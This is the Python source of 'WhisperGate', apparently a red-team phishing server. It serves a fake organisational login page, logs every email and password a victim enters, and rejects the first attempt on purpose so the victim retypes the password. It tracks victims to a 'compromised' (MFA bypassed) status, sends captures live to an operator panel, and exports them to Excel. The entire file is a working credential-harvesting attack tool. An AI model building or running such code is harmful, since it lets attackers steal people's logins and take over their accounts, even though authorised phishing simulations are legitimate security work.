from datetime import datetime

def print_ascii_art():
    ascii_art = """

 __        ___     _                       ____       _       
 \\ \\      / / |__ (_)___ _ __   ___ _ __  / ___| __ _| |_ ___ 
  \\ \\ /\\ / /| '_ \\| / __| '_ \\ / _ \\ '__|| |  _ / _` | __/ _ \\
   \\ V  V / | | | | \\__ \\ |_) |  __/ |   | |_| | (_| | ||  __/
    \\_/\\_/  |_| |_|_|___/ .__/ \\___|_|    \\____|\\__,_|\\__\\___|
                        |_|                                    

    """
    author = "Written by: Justin Henderson - whisk3y3"
    github = "https://github.com/whisk3y3/WhisperGate"
    version = "Version 3.1"
    print(ascii_art)
    print(author)
    print(github)
    print(version)
    print()
    print("Happy Hunting!")
    print()

print_ascii_art()

from flask import Flask, render_template, request, jsonify, session, send_file, redirect
from flask_socketio import SocketIO, emit, join_room
import ssl
import os
import json
import secrets
import io

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*")

# ── Configuration ─────────────────────────────────
# Update these per engagement:
EMAIL_DOMAIN = '@evilphishinc.com'   # Target org email domain
MIN_PASS_LEN = 1                     # Minimum password length to accept
ADMIN_TOKEN = 'changeme'             # Token for operator panel access
REJECT_FIRST_ATTEMPT = True          # Reject first password, accept second
ORG_NAME = 'Contoso'                 # Target organization name

# ── Target tracking ──────────────────────────────
# Keyed by session ID. Each target has full state.
targets = {}

# Engagement start time (set on first credential)
engagement_start = None


def get_target(sid):
    """Get or create a target record."""
    if sid not in targets:
        targets[sid] = {
            'sid': sid,
            'email': None,
            'ip': None,
            'user_agent': None,
            'credentials': [],       # List of {password, attempt, timestamp}
            'status': 'scanning',    # scanning → captured → mfa_pending → compromised → released
            'scan_complete': False,
            'attempts': 0,
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'released_at': None,
            'notes': ''
        }
    return targets[sid]


def log_credentials(sid, email, password, ip, attempt_num, user_agent=''):
    global engagement_start
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Set engagement start on first credential
    if engagement_start is None:
        engagement_start = datetime.now()

    # Update target record
    target = get_target(sid)
    target['email'] = email
    target['ip'] = ip
    target['user_agent'] = user_agent
    target['credentials'].append({
        'password': password,
        'attempt': attempt_num,
        'timestamp': timestamp
    })
    if target['status'] == 'scanning':
        target['status'] = 'captured'

    # File log
    entry = f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password} | Attempt: {attempt_num}"
    with open('credentials.txt', 'a') as f:
        f.write(entry + '\n')

    # Console
    print(f"\n{'='*60}")
    print(f"  CREDENTIAL CAPTURED")
    print(f"  Time:     {timestamp}")
    print(f"  IP:       {ip}")
    print(f"  Email:    {email}")
    print(f"  Password: {password}")
    print(f"  Attempt:  {attempt_num}")
    print(f"  Session:  {sid}")
    print(f"{'='*60}\n")

    # Push to operator panel
    socketio.emit('credential', {
        'sid': sid,
        'timestamp': timestamp,
        'ip': ip,
        'email': email,
        'password': password,
        'attempt': attempt_num,
        'user_agent': user_agent,
        'status': target['status']
    }, namespace='/operator')


# ── Routes ────────────────────────────────────────

@app.route('/')
def index():
    if 'sid' not in session:
        session['sid'] = secrets.token_hex(8)
    get_target(session['sid'])
    return render_template('index.html', org_name=ORG_NAME)


@app.route('/check-email', methods=['POST'])
def check_email():
    data = request.get_json(silent=True) or {}
    email = data.get('email', '').strip()
    sid = session.get('sid', '')
    target = get_target(sid)
    target['email'] = email
    return jsonify({'status': 'ok', 'org': ORG_NAME})


@app.route('/login', methods=['POST'])
def login():
    data = request.get_json(silent=True) or {}
    if not data:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
    else:
        email = data.get('email', '')
        password = data.get('password', '')

    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    sid = session.get('sid', '')

    if not email or len(password) < MIN_PASS_LEN:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 400

    target = get_target(sid)
    target['attempts'] += 1
    attempt_num = target['attempts']

    log_credentials(sid, email, password, ip, attempt_num, user_agent)

    if REJECT_FIRST_ATTEMPT and attempt_num == 1:
        return jsonify({
            'status': 'error',
            'message': 'Your account or password is incorrect. If you don\'t remember your password, reset it now.'
        }), 401

    # Mark as MFA pending when they pass auth
    target['status'] = 'mfa_pending'
    socketio.emit('status_update', {
        'sid': sid,
        'status': 'mfa_pending'
    }, namespace='/operator')

    return jsonify({'status': 'ok', 'sid': sid})


@app.route('/scan-complete', methods=['POST'])
def scan_complete():
    sid = session.get('sid', '')
    target = get_target(sid)
    target['scan_complete'] = True
    return jsonify({'status': 'ok'})


@app.route('/session-state')
def session_state():
    sid = session.get('sid', '')
    target = get_target(sid)
    return jsonify({
        'sid': sid,
        'scan_complete': target.get('scan_complete', False),
        'attempts': target.get('attempts', 0),
        'email': target.get('email', None)
    })


# ── Operator Panel ────────────────────────────────

def operator_authenticated():
    """Check if the current session is authenticated as an operator."""
    return session.get('operator_auth') == True


@app.route('/operator')
def operator_panel():
    if not operator_authenticated():
        return redirect('/operator/login')
    return render_template('operator.html')


@app.route('/operator/login', methods=['GET', 'POST'])
def operator_login():
    if request.method == 'POST':
        token = request.form.get('token', '')
        if token == ADMIN_TOKEN:
            session['operator_auth'] = True
            return redirect('/operator')
        else:
            return render_template('operator_login.html', error='Invalid access token.')
    return render_template('operator_login.html', error=None)


@app.route('/operator/logout')
def operator_logout():
    session.pop('operator_auth', None)
    return redirect('/operator/login')


@app.route('/operator/targets')
def get_targets():
    """Returns all target data for operator panel initial load."""
    if not operator_authenticated():
        return 'Unauthorized', 403
    return jsonify({
        'targets': list(targets.values()),
        'engagement_start': engagement_start.strftime('%Y-%m-%d %H:%M:%S') if engagement_start else None
    })


@app.route('/operator/note', methods=['POST'])
def save_note():
    """Save a note on a target."""
    if not operator_authenticated():
        return 'Unauthorized', 403
    data = request.get_json(silent=True) or {}
    sid = data.get('sid', '')
    note = data.get('note', '')
    if sid in targets:
        targets[sid]['notes'] = note
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error', 'message': 'Target not found'}), 404


@app.route('/operator/status', methods=['POST'])
def update_status():
    """Operator manually updates a target's status."""
    if not operator_authenticated():
        return 'Unauthorized', 403
    data = request.get_json(silent=True) or {}
    sid = data.get('sid', '')
    status = data.get('status', '')
    if sid in targets and status in ('captured', 'mfa_pending', 'compromised', 'released'):
        targets[sid]['status'] = status
        if status == 'released':
            targets[sid]['released_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error'}), 400


@app.route('/operator/export')
def export_excel():
    """Export all targets to Excel."""
    if not operator_authenticated():
        return 'Unauthorized', 403

    try:
        import openpyxl
        from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
    except ImportError:
        return 'openpyxl not installed. Run: pip install openpyxl', 500

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = 'Captured Credentials'

    # Header styling
    header_font = Font(bold=True, color='FFFFFF', size=11)
    header_fill = PatternFill(start_color='1F4E79', end_color='1F4E79', fill_type='solid')
    thin_border = Border(
        left=Side(style='thin'), right=Side(style='thin'),
        top=Side(style='thin'), bottom=Side(style='thin')
    )

    headers = ['Email', 'Password', 'Attempt', 'Timestamp', 'IP Address',
               'User Agent', 'Status', 'MFA Bypassed', 'Released At', 'Notes']
    for col, header in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=header)
        cell.font = header_font
        cell.fill = header_fill
        cell.alignment = Alignment(horizontal='center')
        cell.border = thin_border

    row = 2
    for target in targets.values():
        if not target['credentials']:
            continue
        for cred in target['credentials']:
            ws.cell(row=row, column=1, value=target['email']).border = thin_border
            ws.cell(row=row, column=2, value=cred['password']).border = thin_border
            ws.cell(row=row, column=3, value=cred['attempt']).border = thin_border
            ws.cell(row=row, column=4, value=cred['timestamp']).border = thin_border
            ws.cell(row=row, column=5, value=target['ip']).border = thin_border
            ws.cell(row=row, column=6, value=target['user_agent']).border = thin_border
            ws.cell(row=row, column=7, value=target['status']).border = thin_border
            mfa = 'Yes' if target['status'] in ('compromised', 'released') else 'No'
            ws.cell(row=row, column=8, value=mfa).border = thin_border
            ws.cell(row=row, column=9, value=target.get('released_at', '')).border = thin_border
            ws.cell(row=row, column=10, value=target.get('notes', '')).border = thin_border
            row += 1

    # Auto-width columns
    for col in ws.columns:
        max_len = 0
        col_letter = col[0].column_letter
        for cell in col:
            if cell.value:
                max_len = max(max_len, len(str(cell.value)))
        ws.column_dimensions[col_letter].width = min(max_len + 4, 50)

    # Engagement summary sheet
    ws2 = wb.create_sheet('Engagement Summary')
    ws2.cell(row=1, column=1, value='Engagement Summary').font = Font(bold=True, size=14)
    ws2.cell(row=3, column=1, value='Start Time:').font = Font(bold=True)
    ws2.cell(row=3, column=2, value=engagement_start.strftime('%Y-%m-%d %H:%M:%S') if engagement_start else 'N/A')
    ws2.cell(row=4, column=1, value='Export Time:').font = Font(bold=True)
    ws2.cell(row=4, column=2, value=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    ws2.cell(row=5, column=1, value='Total Targets:').font = Font(bold=True)
    ws2.cell(row=5, column=2, value=len([t for t in targets.values() if t['credentials']]))
    ws2.cell(row=6, column=1, value='MFA Bypassed:').font = Font(bold=True)
    ws2.cell(row=6, column=2, value=len([t for t in targets.values() if t['status'] in ('compromised', 'released')]))
    ws2.cell(row=7, column=1, value='Organization:').font = Font(bold=True)
    ws2.cell(row=7, column=2, value=ORG_NAME)

    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)

    filename = f"WhisperGate_{ORG_NAME}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
    return send_file(buf, as_attachment=True, download_name=filename,
                     mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')


# ── WebSocket: Operator ───────────────────────────

@socketio.on('connect', namespace='/operator')
def operator_connect():
    print('[Operator] Panel connected')


@socketio.on('release_target', namespace='/operator')
def release_target(data):
    """Release a specific target by session ID."""
    sid = data.get('sid', '')
    if sid in targets:
        targets[sid]['status'] = 'released'
        targets[sid]['released_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        # Send release only to that target's room
        socketio.emit('force_next', room=f'target_{sid}', namespace='/target')
        # Notify operator panel
        socketio.emit('status_update', {
            'sid': sid,
            'status': 'released',
            'released_at': targets[sid]['released_at']
        }, namespace='/operator')
        print(f'[Operator] Released target: {targets[sid].get("email", sid)}')


@socketio.on('mark_compromised', namespace='/operator')
def mark_compromised(data):
    """Operator marks target as compromised (MFA bypassed)."""
    sid = data.get('sid', '')
    if sid in targets:
        targets[sid]['status'] = 'compromised'
        socketio.emit('status_update', {
            'sid': sid,
            'status': 'compromised'
        }, namespace='/operator')
        print(f'[Operator] Marked compromised: {targets[sid].get("email", sid)}')


# ── WebSocket: Target ─────────────────────────────

@socketio.on('connect', namespace='/target')
def target_connect():
    pass


@socketio.on('register', namespace='/target')
def target_register(data):
    """Target registers with their session ID to join their private room."""
    sid = data.get('sid', '')
    if sid:
        join_room(f'target_{sid}')


# ── Main ──────────────────────────────────────────

if __name__ == '__main__':
    cert_file = 'fullchain.pem'
    key_file = 'privkey.pem'

    if os.path.exists(cert_file) and os.path.exists(key_file):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        socketio.run(app, host='0.0.0.0', port=443, ssl_context=context)
    else:
        print('[!] SSL certs not found — running on HTTP :5000 (dev mode)')
        socketio.run(app, host='0.0.0.0', port=5000, debug=True)
